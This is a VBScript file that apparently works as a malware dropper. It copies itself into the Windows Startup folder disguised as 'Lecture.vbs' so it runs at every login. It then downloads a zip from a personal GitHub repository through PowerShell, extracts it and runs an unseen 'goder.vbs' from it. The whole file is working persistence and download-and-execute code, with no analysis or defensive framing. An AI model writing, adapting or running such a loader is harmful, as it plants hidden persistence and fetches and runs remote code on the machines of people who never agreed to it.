Dim objFSO, objShell, objFolder, objFile

' Initialize objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Define paths
Dim startupFolderPath, selfScriptPath, selfScriptName, lectureScriptPath
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)
lectureScriptPath = startupFolderPath & "\" & "Lecture.vbs"

' Check if Lecture.vbs exists in startup folder
If Not objFSO.FileExists(lectureScriptPath) Then
    ' Copy itself to startup folder as Lecture.vbs
    objFSO.CopyFile selfScriptPath, lectureScriptPath
End If

' Continue with the rest of the code

' Define paths
Dim megaFolderPath, zipFilePath, zipExtractPath, url
megaFolderPath = "C:\Mega"
zipFilePath = megaFolderPath & "\MEGAcmd.zip"
zipExtractPath = megaFolderPath & "\MEGAcmd"
url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"

' Check if Mega folder exists
If Not objFSO.FolderExists(megaFolderPath) Then
    ' Create Mega folder if it doesn't exist
    objFSO.CreateFolder(megaFolderPath)
    
    ' Download the zip file
    objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')"""
    
    ' Check if zip file is downloaded
    Do While Not objFSO.FileExists(zipFilePath)
        WScript.Sleep 1000 ' Wait for 1 second
    Loop
    
    ' Extract the zip file
    If objFSO.FileExists(zipFilePath) Then
        Dim objShellApp
        Set objShellApp = CreateObject("Shell.Application")
        objShellApp.Namespace(zipExtractPath).CopyHere objShellApp.Namespace(zipFilePath).Items
        
        ' Check if zip file is extracted
        Do While Not objFSO.FolderExists(zipExtractPath)
            WScript.Sleep 1000 ' Wait for 1 second
        Loop
        
        ' Delete the zip file
        If objFSO.FolderExists(zipExtractPath) Then
            objFSO.DeleteFile(zipFilePath)
        End If
        
        ' Run file
        If objFSO.FolderExists(zipExtractPath) Then
            objShell.Run "cmd /c cd " & zipExtractPath & " && goder.vbs", 1, True
        End If
    End If
Else
    ' Run file
    objShell.Run "cmd /c cd " & megaFolderPath & "\MEGAcmd && goder.vbs", 1, True
End If

' Clean up
Set objFSO = Nothing
Set objShell = Nothing
